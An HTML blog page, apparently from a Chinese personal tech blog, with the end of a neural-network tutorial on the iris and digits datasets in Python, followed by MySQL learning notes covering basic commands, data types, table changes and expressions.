class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span></span><br><span class="line">      <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>]</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="对测试集使用训练得来的参数">对测试集使用训练得来的参数</h2><p>可以看到，测试集中50个样本有_个判定错误，其它_个分类正确。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">11</span>]:</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(final_nn, input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span>:</span></span><br><span class="line">    Theta_1 = final_nn[:hidden_layer_size * (input_layer_size + <span class="number">1</span>)].reshape((hidden_layer_size, input_layer_size + <span class="number">1</span>))</span><br><span class="line">    Theta_2 = final_nn[hidden_layer_size * (input_layer_size + <span class="number">1</span>):].reshape((classes, hidden_layer_size + <span class="number">1</span>))</span><br><span class="line">    nsuccess = np.sum(np.argmax(predict(Theta_1, Theta_2, X), axis=<span class="number">1</span>) == y)</span><br><span class="line">    <span class="keyword">return</span> nsuccess</span><br><span class="line"></span><br><span class="line">n = test(final_nn, input_layer_size, hidden_layer_size, classes, iris.data[<span class="number">100</span>:], iris.target[<span class="number">100</span>:], lamb_da)</span><br><span class="line"><span class="keyword">print</span> n</span><br><span class="line">n = test(final_nn, input_layer_size, hidden_layer_size, classes, iris.data[:<span class="number">100</span>], iris.target[:<span class="number">100</span>], lamb_da)</span><br><span class="line"><span class="keyword">print</span> n</span><br><span class="line"></span><br><span class="line">Out[<span class="number">11</span>]:</span><br><span class="line">    <span class="number">47</span></span><br><span class="line">    <span class="number">99</span></span><br></pre></td></tr></table></figure>
<hr>
<h1 id="另一个例子：手写数字数据集">另一个例子：手写数字数据集</h1><p>最后是对同样著名的手写数字数据集的实验。</p>
<h3 id="载入并观察数据集：">载入并观察数据集：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">12</span>]:</span><br><span class="line">digits = datasets.load_digits()</span><br><span class="line"></span><br><span class="line"><span class="comment"># random it</span></span><br><span class="line">perm = np.random.permutation(digits.target.size)</span><br><span class="line">digits.data = digits.data[perm]</span><br><span class="line">digits.target = digits.target[perm]</span><br><span class="line"><span class="keyword">print</span> digits.data.shape</span><br><span class="line"><span class="keyword">print</span> digits.target.shape</span><br><span class="line"><span class="keyword">print</span> np.unique(digits.target)</span><br><span class="line"></span><br><span class="line">Out[<span class="number">12</span>]:</span><br><span class="line">    (<span class="number">1797</span>, <span class="number">64</span>)</span><br><span class="line">    (<span class="number">1797</span>,)</span><br><span class="line">    [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="选择神经网络参数">选择神经网络参数</h2><p>取1000个样本作为训练集，剩下作为测试集。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">13</span>]:</span><br><span class="line">X = digits.data[:<span class="number">1000</span>]</span><br><span class="line">y = digits.target[:<span class="number">1000</span>]</span><br><span class="line">lamb_da = <span class="number">1.0</span> <span class="comment"># must be float</span></span><br><span class="line">input_layer_size = <span class="number">64</span></span><br><span class="line">hidden_layer_size = <span class="number">10</span></span><br><span class="line">classes = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">final_nn = train(input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span><br><span class="line"></span><br><span class="line">Out[<span class="number">13</span>]:</span><br><span class="line">    Warning: Desired error <span class="keyword">not</span> necessarily achieved due to precision loss.</span><br><span class="line">             Current function value: <span class="number">0.594474</span></span><br><span class="line">             Iterations: <span class="number">965</span></span><br><span class="line">             Function evaluations: <span class="number">2210</span></span><br><span class="line">             Gradient evaluations: <span class="number">2189</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="进行梯度检测">进行梯度检测</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">14</span>]:</span><br><span class="line"><span class="comment"># gradient checking</span></span><br><span class="line">grad_aprox = compute_grad(final_nn, input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span><br><span class="line">grad_bp = Gradient(final_nn, input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span><br><span class="line"><span class="keyword">print</span> np.all((grad_aprox - grad_bp) &lt; <span class="number">1e-1</span>)</span><br><span class="line"></span><br><span class="line">Out[<span class="number">14</span>]:</span><br><span class="line">    <span class="keyword">True</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="对测试集使用训练得来的参数-1">对测试集使用训练得来的参数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">15</span>]:</span><br><span class="line"></span><br><span class="line">n = test(final_nn, input_layer_size, hidden_layer_size, classes, digits.data[<span class="number">1000</span>:], digits.target[<span class="number">1000</span>:], lamb_da)</span><br><span class="line"><span class="keyword">print</span> n</span><br><span class="line"></span><br><span class="line">n = test(final_nn, input_layer_size, hidden_layer_size, classes, digits.data[:<span class="number">1000</span>], digits.target[:<span class="number">1000</span>], lamb_da)</span><br><span class="line"><span class="keyword">print</span> n</span><br><span class="line"></span><br><span class="line">Out[<span class="number">15</span>]:</span><br><span class="line"></span><br><span class="line">    <span class="number">722</span></span><br><span class="line">    <span class="number">991</span></span><br></pre></td></tr></table></figure>
<hr>
<center><br><h3>BY REVERLAND</h3><br></center>



            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/SQL/2014/05/31/mysql-learning-notes/" itemprop="url">
                  MySQL Learning Notes
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-05-31T00:00:00+08:00" content="2014-05-31">
              2014-05-31
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/SQL/" itemprop="url" rel="index">
                    <span itemprop="name">SQL</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/SQL/2014/05/31/mysql-learning-notes/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="SQL/2014/05/31/mysql-learning-notes/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>随便看看，来自<a href="http://zetcode.com" target="_blank" rel="external">http://zetcode.com</a>的教程笔记。放到一个文档里便于通过<code>Ctrl+F</code>快速查找。</p>
<h2 id="安装">安装</h2><p>从软件源安装基本是一键安装。</p>
<p>源码安装参见<a href="http://zetcode.com/databases/mysqltutorial/installation" target="_blank" rel="external">MySQL installation</a></p>
<h2 id="初步">初步</h2><p>启动和停止服务，反正gentoo下是</p>
<pre><code>sudo /etc/init.d/mysqld <span class="operator"><span class="keyword">start</span>
sudo /etc/init.<span class="keyword">d</span>/mysqld <span class="keyword">stop</span>
sudo /etc/init.<span class="keyword">d</span>/mysqld restart</span>
</code></pre><p>手动启动<code>mysqld_safe &amp;</code>也行。</p>
<p>检查服务是否启动：</p>
<pre><code> <span class="regexp">~/Work/</span>learn/MySQL ⮀ mysqladmin -uroot -p ping
Enter <span class="string">password:</span> 
mysqld is alive
</code></pre><p><code>mysqladmin</code>还可以用来关闭服务，参见<code>man mysqladmin</code>.</p>
<p><code>mysql -uroot -p</code>直接连接到mysql的交互shell中去。</p>
<p>在这个shell中可以使用命令(比如<code>system pwd</code>)也可以使用SQL语句，SQL语句以分号结束。</p>
<p>查看数据库:</p>
<pre><code><span class="operator"><span class="keyword">SHOW</span> <span class="keyword">DATABASES</span>;</span>
</code></pre><p>创建数据库<code>mydb</code></p>
<pre><code>CREAT DATABASE mydb<span class="comment">;</span>
</code></pre><p>使用数据库<code>mydb</code></p>
<pre><code><span class="keyword">use</span> <span class="title">mydb</span>;
</code></pre><p>显示数据库中的表：</p>
<pre><code><span class="operator"><span class="keyword">SHOW</span> <span class="keyword">TABLES</span>;</span>
</code></pre><p>执行数据库文件：</p>
<pre><code><span class="built_in">source</span> cars.sql
</code></pre><p>从表中选择：</p>
<pre><code><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars;</span>
</code></pre><p>创建新用户</p>
<pre><code><span class="operator"><span class="keyword">CREATE</span> <span class="keyword">USER</span> user123@localhost <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'pass123'</span>;</span>
</code></pre><p>授予用户对特定数据库/表的特定权限</p>
<pre><code><span class="operator"><span class="keyword">GRANT</span> ALL <span class="keyword">ON</span> mydb.* <span class="keyword">to</span> user123@localhost;</span>
</code></pre><h2 id="快速教程">快速教程</h2><p>root用户：</p>
<ul>
<li>创建数据库</li>
<li>使用数据库</li>
<li>导入数据库文件(吐槽下mysql数据库导入的神慢)</li>
<li>授予权限</li>
</ul>
<p>普通用户：</p>
<ul>
<li>查看数据库</li>
<li>使用数据库</li>
<li>查看表</li>
</ul>
<p>描述表：</p>
<pre><code><span class="operator"><span class="keyword">DESCRIBE</span> City;</span>
</code></pre><p>查看创建表的命令</p>
<pre><code><span class="operator"><span class="keyword">SHOW</span> CREAT <span class="keyword">TABLE</span> City;</span>
</code></pre><p>使用<code>mysqldump</code>备份表(在系统shell中而不是mysql的交互shell)</p>
<pre><code>mysqldump -uroot -<span class="tag">p</span> world City &gt; city.sql
</code></pre><p>移除表</p>
<pre><code><span class="operator"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> City;</span>
</code></pre><p>接着讲讲查表。</p>
<p>限制条数：</p>
<pre><code><span class="operator"><span class="keyword">SELECT</span> <span class="keyword">Id</span>, <span class="keyword">Name</span>, Population <span class="keyword">FROM</span> City <span class="keyword">LIMIT</span> <span class="number">10</span>;</span>
<span class="operator"><span class="keyword">SELECT</span> <span class="keyword">Id</span>, <span class="keyword">Name</span>, Population <span class="keyword">FROM</span> City <span class="keyword">LIMIT</span> <span class="number">15</span>, <span class="number">5</span>;</span>
</code></pre><p>使用<code>less</code>分页，</p>
<pre><code>pager <span class="operator">less</span>
</code></pre><p>非交互式使用SQL命令</p>
<pre><code>mysql -<span class="keyword">u</span> user123 -p world -<span class="keyword">e</span> <span class="string">"SELECT * FROM City"</span> &gt; city
</code></pre><p>COUNT函数</p>
<pre><code><span class="operator"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(<span class="keyword">Id</span>) <span class="keyword">AS</span> <span class="string">'Number of rows'</span> <span class="keyword">FROM</span> City;</span>
</code></pre><p>MAX, 下面命令显示了SQL的子查询特性:</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Population <span class="keyword">FROM</span> City
    -&gt; WHERE Population = (<span class="built_in">SELECT</span> <span class="built_in">Max</span>(Population) <span class="keyword">FROM</span> City);
</code></pre><p>MIN:</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Population <span class="keyword">FROM</span> City
    -&gt; WHERE Population = (<span class="built_in">SELECT</span> <span class="built_in">Min</span>(Population) <span class="keyword">FROM</span> City);
</code></pre><p>WHERE语句</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, Population <span class="keyword">FROM</span> City 
    -&gt; <span class="keyword">WHERE</span> Population &gt; <span class="number">1000000</span>;

mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> City <span class="keyword">WHERE</span> Name <span class="keyword">LIKE</span> <span class="comment">'Kal%';</span>

mysql&gt; <span class="keyword">SELECT</span> Name, Population <span class="keyword">FROM</span> City 
    -&gt; <span class="keyword">WHERE</span> ID <span class="keyword">IN</span> (<span class="number">5</span>, <span class="number">32</span>, <span class="number">344</span>, <span class="number">554</span>);

mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> City <span class="keyword">WHERE</span> Name = <span class="comment">'Bratislava';</span>

mysql&gt; <span class="keyword">SELECT</span> Name, Population <span class="keyword">FROM</span> City 
    -&gt; <span class="keyword">WHERE</span> Population BETWEEN <span class="number">670000</span> <span class="keyword">AND</span> <span class="number">700000</span>;
</code></pre><p>排序数据</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, Population FROM City
    <span class="subst">-&gt; </span><span class="keyword">ORDER</span> <span class="keyword">BY</span> Population DESC LIMIT <span class="number">10</span>;

mysql&gt; <span class="keyword">SELECT</span> Name, Population FROM City 
    <span class="subst">-&gt; </span><span class="keyword">ORDER</span> <span class="keyword">BY</span> Population ASC LIMIT <span class="number">10</span>;

mysql&gt; <span class="keyword">SELECT</span> Name, Population FROM City 
    <span class="subst">-&gt; </span><span class="keyword">ORDER</span> <span class="keyword">BY</span> Name LIMIT <span class="number">10</span>;
</code></pre><p>聚合数据</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> District, <span class="keyword">SUM</span>(Population) FROM City
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> District = <span class="string">'Henan'</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> District;

mysql&gt; <span class="keyword">SELECT</span> Name, District, Population FROM City
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> District = <span class="string">'Henan'</span>;

mysql&gt; <span class="keyword">SELECT</span> District, <span class="keyword">SUM</span>(Population) FROM City
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> CountryCode = <span class="string">'USA'</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> District
    <span class="subst">-&gt; </span>HAVING <span class="keyword">SUM</span>(Population) &gt; <span class="number">3000000</span>;
</code></pre><p>更新，删除和插入数据</p>
<pre><code>mysql&gt; UPDATE Country <span class="built_in">SET</span> HeadOfState = <span class="string">'Xi Jinping'</span> 
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> Name = <span class="string">'China'</span>;

mysql&gt; DELETE FROM City <span class="keyword">WHERE</span> ID <span class="keyword">IN</span> (<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>);

mysql&gt; TRUNCATE TABLE City;

mysql&gt; INSERT <span class="keyword">INTO</span> City VALUES(<span class="number">999999</span>, <span class="string">'Kabul'</span>, <span class="string">'AFG'</span>, <span class="string">'Kabol'</span>, <span class="number">1780000</span>);

mysql&gt; DROP TABLE City
</code></pre><h2 id="MySQL存储引擎">MySQL存储引擎</h2><p>存储引擎是数据库管理系统读写更新数据库中数据的软件模型。</p>
<p>MySQL支持的存储引擎有：</p>
<ul>
<li>MyISAM，早于5.5版本的默认引擎</li>
<li>InnoDB</li>
<li>Memory</li>
<li>CSV</li>
<li>等等</li>
</ul>
<p>情况很复杂，选择之前最好上<a href="http://stackoverflow.com/" target="_blank" rel="external">StackOverFlow</a>问问。</p>
<p>创建表时使用<code>ENGINE</code>关键字指定引擎：</p>
<pre><code>mysql&gt; CREATE TABLE Cars(Id <span class="built_in">INTEGER</span> PRIMARY KEY, Name VARCHAR(<span class="number">50</span>), 
    <span class="subst">-&gt; </span>Cost <span class="built_in">INTEGER</span>) ENGINE=<span class="string">'MyISAM'</span>;
</code></pre><p>查看当前引擎：</p>
<pre><code>mysql&gt; SHOW <span class="section"><span class="keyword">VARIABLES</span> LIKE 'storage_engine';</span>
</code></pre><p>发现特定数据库的表引擎</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> ENGINE FROM information_schema<span class="built_in">.</span>TABLES
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="string">'mydb'</span>
    <span class="subst">-&gt; </span><span class="subst">AND</span> TABLE_NAME=<span class="string">'Cars'</span>;
</code></pre><p>更改表的引擎：</p>
<pre><code>mysql&gt; ALTER <span class="keyword">TABLE</span> Cars ENGINE=<span class="string">'InnoDB'</span>;
</code></pre><h2 id="MySQL数据类型">MySQL数据类型</h2><h3 id="数值">数值</h3><p>整数：</p>
<table>
<thead>
<tr>
<th>Data type</th>
<th>Bytes</th>
<th>Minimum value</th>
<th>Maximum value</th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYINT</td>
<td>1</td>
<td>-128</td>
<td>127</td>
</tr>
<tr>
<td>SMALLINT</td>
<td>2</td>
<td>-32768</td>
<td>32767</td>
</tr>
<tr>
<td>MEDIUMINT</td>
<td>3</td>
<td>-8388608</td>
<td>8388607</td>
</tr>
<tr>
<td>INTEGER</td>
<td>4</td>
<td>-2147483648</td>
<td>2147483647</td>
</tr>
<tr>
<td>BIGINT</td>
<td>8</td>
<td>-9223372036854775808</td>
<td>9223372036854775807</td>
</tr>
</tbody>
</table>
<p>浮点：</p>
<table>
<thead>
<tr>
<th>Data type</th>
<th>Bytes</th>
</tr>
</thead>
<tbody>
<tr>
<td>FLOAT</td>
<td>4</td>
</tr>
<tr>
<td>DOUBLE</td>
<td>8</td>
</tr>
<tr>
<td>DECIML</td>
<td>(M位，小数点后D位)</td>
</tr>
</tbody>
</table>
<p>定义表时指定：</p>
<pre><code>mysql&gt; CREATE TABLE Numbers <span class="list">(<span class="keyword">Id</span> TINYINT, Floats FLOAT, Decimals DECIMAL<span class="list">(<span class="number">3</span>, <span class="number">2</span>)</span>)</span><span class="comment">;</span>
</code></pre><p>更改列字段内型：</p>
<pre><code>mysql&gt; ALTER TABLE Ages MODIFY Age TINYINT UNSIGNED<span class="comment">;</span>
</code></pre><p>插入值</p>
<pre><code><span class="tag">mysql</span>&gt; <span class="tag">INSERT</span> <span class="tag">INTO</span> <span class="tag">Numbers</span> <span class="tag">VALUES</span> (1, 1<span class="class">.1</span>, 1<span class="class">.1</span>), (2, 1<span class="class">.1</span>, 1<span class="class">.1</span>), (3, 1<span class="class">.1</span>, 1<span class="class">.1</span>);
</code></pre><p>DECIMAL类型更加精确，FLOAT和DOUBLE都只是近似。</p>
<h3 id="日期和时间">日期和时间</h3><p>有这么几种：</p>
<table>
<thead>
<tr>
<th>Data type</th>
<th>范围</th>
<th>显示格式</th>
</tr>
</thead>
<tbody>
<tr>
<td>DATE</td>
<td>‘1000-01-01’ 到 ‘9999-12-31’.</td>
<td>YYYY-MM-DD</td>
</tr>
<tr>
<td>TIME</td>
<td>‘-838:59:59’ to ‘838:59:59’.</td>
<td>HH:MM:SS</td>
</tr>
<tr>
<td>DATETIME</td>
<td>‘1000-01-01 00:00:00’ to ‘9999-12-31 23:59:59’.</td>
<td>YYYY-MM-DD HH:MM:SS</td>
</tr>
<tr>
<td>YEAR</td>
<td>1901 to 2155</td>
<td>YYYY</td>
</tr>
<tr>
<td>TIMESTAMP</td>
<td>‘1970-01-01 00:00:01’ UTC to ‘2038-01-19 03:14:07’ UTC</td>
<td>见下表</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>Data type</th>
<th>Format</th>
</tr>
</thead>
<tbody>
<tr>
<td>TIMESTAMP(14)</td>
<td>YYYYMMDDHHMMSS</td>
</tr>
<tr>
<td>TIMESTAMP(12)</td>
<td>YYMMDDHHMMSS</td>
</tr>
<tr>
<td>TIMESTAMP(10)</td>
<td>YYMMDDHHMM</td>
</tr>
<tr>
<td>TIMESTAMP(8)</td>
<td>YYYYMMDD</td>
</tr>
<tr>
<td>TIMESTAMP(6)</td>
<td>YYMMDD</td>
</tr>
<tr>
<td>TIMESTAMP(4)</td>
<td>YYMM</td>
</tr>
<tr>
<td>TIMESTAMP(2)</td>
<td>YY</td>
</tr>
</tbody>
</table>
<p>DATE、DATETIME和DATE输入时可支持多种格式，分隔符可以任意，超出范围截断到0.</p>
<pre><code>mysql&gt; CREATE <span class="function">TABLE <span class="title">Dates</span><span class="params">(Id TINYINT, Dates DATE)</span></span>;
mysql&gt; INSERT INTO <span class="function">Dates <span class="title">VALUES</span><span class="params">(<span class="number">1</span>, <span class="string">'2011-01-24'</span>)</span></span>;
mysql&gt; INSERT INTO <span class="function">Dates <span class="title">VALUES</span><span class="params">(<span class="number">2</span>, <span class="string">'2011/01/25'</span>)</span></span>;
mysql&gt; INSERT INTO <span class="function">Dates <span class="title">VALUES</span><span class="params">(<span class="number">3</span>, <span class="string">'20110126'</span>)</span></span>;
mysql&gt; INSERT INTO <span class="function">Dates <span class="title">VALUES</span><span class="params">(<span class="number">4</span>, <span class="string">'110127'</span>)</span></span>;
mysql&gt; INSERT INTO <span class="function">Dates <span class="title">VALUES</span><span class="params">(<span class="number">5</span>, <span class="string">'2011+01+28'</span>)</span></span>;
</code></pre><p><code>TIMEDIFF</code>计算时差：</p>
<pre><code>mysql&gt; <span class="function">SELECT <span class="title">TIMEDIFF</span><span class="params">(<span class="string">'23:34:32'</span>, <span class="string">'22:00:00'</span>)</span></span>;
</code></pre><p><code>TIME</code>函数提取时间部分</p>
<pre><code>mysql&gt; <span class="function">SELECT <span class="title">TIME</span><span class="params">(<span class="string">'2011-01-29 11:27:42'</span>)</span></span>;
</code></pre><p><code>DAYNAME</code>函数提取星期名。</p>
<pre><code>mysql&gt; SELECT DAYNAME('<span class="number">2011</span><span class="number">@01</span><span class="number">@29</span> <span class="number">11</span><span class="number">@50</span><span class="number">@13</span>');
</code></pre><p>MySQL自动填充TIMESTAMP列，记录<code>INSERT</code>和<code>UPDATE</code>时间。</p>
<h3 id="字符串">字符串</h3><table>
<thead>
<tr>
<th>Data type</th>
<th>Format</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>CHAR</td>
<td>CHAR(x),x=0:255</td>
<td>定长字符串存储</td>
</tr>
<tr>
<td>VARCHAR</td>
<td>VARCHAR(x),x=0:65535</td>
<td>变长字符串数据存储</td>
</tr>
<tr>
<td>BINARY</td>
<td>BINARY(x),x=0:255</td>
<td>定长字节存储</td>
</tr>
<tr>
<td>VARBINARY</td>
<td>VARBINARY(x),x=0:65535</td>
<td>变长字节存储</td>
</tr>
<tr>
<td>TINYBLOB</td>
<td>0-255</td>
<td>BLOB存储大二进制对象</td>
</tr>
<tr>
<td>BLOB</td>
<td>0-65535</td>
<td></td>
</tr>
<tr>
<td>MEDIUMBLOB</td>
<td>0 - 16777215</td>
<td></td>
</tr>
<tr>
<td>LONGBLOB</td>
<td>0 - 4294967295</td>
<td></td>
</tr>
<tr>
<td>TINYTEXT</td>
<td>0-255</td>
<td>TEXT存储大文本数据</td>
</tr>
<tr>
<td>TEXT</td>
<td>0-65535</td>
<td></td>
</tr>
<tr>
<td>MEDIUMTEXT</td>
<td>0 - 16777215</td>
<td></td>
</tr>
<tr>
<td>LONGTEXT</td>
<td>0 - 4294967295</td>
</tr>
</tbody>
</table>
<p><code>ENUM</code>创建一个只能插入列表中特定值的表</p>
<pre><code>mysql&gt; CREATE TABLE SizeTable<span class="list">(<span class="keyword">Size</span> ENUM<span class="list">(<span class="quoted">'S</span>', <span class="quoted">'M</span>', <span class="quoted">'L</span>', <span class="quoted">'XL</span>', <span class="quoted">'XXL</span>')</span>)</span><span class="comment">;</span>
</code></pre><p><code>SET</code>类似于<code>ENUM</code>，但可以包含0个或多个列表中的值。</p>
<h2 id="创建、更改和删除表">创建、更改和删除表</h2><h3 id="创建指令">创建指令</h3><p>创建一个表，指定表名、列的名称和类型：</p>
<pre><code>mysql&gt; CREATE <span class="keyword">TABLE</span> Testing(Id <span class="keyword">INTEGER</span>);
</code></pre><p>查看某个表的建表语句</p>
<pre><code>mysql&gt; SHOW CREATE TABLE Testing<span class="comment">;</span>
</code></pre><p>创建的，非临时表可以通过<code>SHOW TABLES</code>语法查看：</p>
<pre><code>mysql&gt; SHOW TABLES <span class="keyword">LIKE</span> <span class="comment">'T%';</span>
</code></pre><h2 id="删除表">删除表</h2><p>删除表：</p>
<pre><code>mysql&gt; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> Testing;
</code></pre><h2 id="更改表">更改表</h2><p>使用<code>ALTER TABLE</code>语法更改表。以下为重命名表、添加列、添加主键、更改列、删除列操作。(DESCRIBE和SHOW COLUMNS FROM同义，INTEGER和INT相同)</p>
<pre><code>mysql&gt; ALTER <span class="keyword">TABLE</span> Testing <span class="keyword">RENAME</span> TO TestTable;
mysql&gt; ALTER <span class="keyword">TABLE</span> TestTable ADD iValues INT;
mysql&gt; ALTER <span class="keyword">TABLE</span> TestTable ADD PRIMARY KEY (Id);
mysql&gt; ALTER <span class="keyword">TABLE</span> TestTable CHANGE COLUMN iValues iValues1 INT;
mysql&gt; ALTER <span class="keyword">TABLE</span> TestTable <span class="keyword">DROP</span> COLUMN iValues1;
</code></pre><h2 id="MySQL表达式">MySQL表达式</h2><h3 id="字面常量">字面常量</h3><pre><code>mysql&gt; <span class="keyword">SELECT</span> <span class="number">3</span>, <span class="string">'Wolf'</span>, <span class="number">34.5</span>, <span class="number">0x34</span>, <span class="number">0</span>+b<span class="string">'10111'</span><span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> <span class="literal">NULL</span>, \N<span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> <span class="literal">TRUE</span>, <span class="literal">FALSE</span><span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> <span class="string">'2011-01-11'</span>, <span class="string">'23:33:01'</span>, <span class="string">'98/11/31/ 14:22:20'</span><span class="comment">;</span>
</code></pre><h3 id="变量">变量</h3><pre><code>mysql&gt; SET <span class="constant">@name</span> = <span class="string">'Jane'</span><span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> <span class="constant">@name</span><span class="comment">;</span>
</code></pre><h3 id="运算符">运算符</h3><p>包括一元的</p>
<pre><code>mysql&gt; <span class="function">SELECT <span class="title">NOT</span> <span class="params">(<span class="number">3</span>&gt;<span class="number">9</span>)</span></span>;
</code></pre><p>算术的：</p>
<pre><code>mysql&gt; SELECT <span class="number">9</span>/<span class="number">2</span>, <span class="number">9</span> DIV <span class="number">2</span>;
</code></pre><p>逻辑的：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> <span class="literal">FALSE</span> <span class="keyword">XOR</span> <span class="literal">FALSE</span>, <span class="literal">FALSE</span> <span class="keyword">XOR</span> <span class="literal">TRUE</span>,
-&gt; <span class="literal">TRUE</span> <span class="keyword">XOR</span> <span class="literal">FALSE</span>, <span class="literal">TRUE</span> <span class="keyword">XOR</span> <span class="literal">TRUE</span>;
</code></pre><p>关系的：</p>
<pre><code>mysql&gt; SELECT <span class="number">3</span> * <span class="number">3</span> = <span class="number">9</span>, <span class="number">9</span> = <span class="number">9</span>, <span class="number">3</span> &lt; <span class="number">4</span>, <span class="number">3</span> &lt;&gt; <span class="number">5</span>, <span class="number">4</span> &lt;= <span class="number">4</span>, <span class="number">5</span> != <span class="number">5</span>;
</code></pre><p>位的：</p>
<pre><code>mysql&gt; SELECT <span class="number">6</span> | <span class="number">3</span>, <span class="number">6</span> &amp; <span class="number">3</span>, <span class="number">6</span> &lt;&lt; <span class="number">1</span>;
</code></pre><p>其它：</p>
<pre><code>mysql&gt; <span class="keyword">SET</span> @running = <span class="keyword">FALSE</span>;
mysql&gt; <span class="keyword">SELECT</span> @running <span class="keyword">IS</span> <span class="keyword">FALSE</span>;
mysql&gt; <span class="keyword">SELECT</span> <span class="string">'Tom'</span> <span class="keyword">IN</span> (<span class="string">'Tom'</span>, <span class="string">'Frank'</span>, <span class="string">'Jane'</span>);
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">Where</span> Name <span class="keyword">IN</span> (<span class="string">'Audi'</span>, <span class="string">'Hummer'</span>);
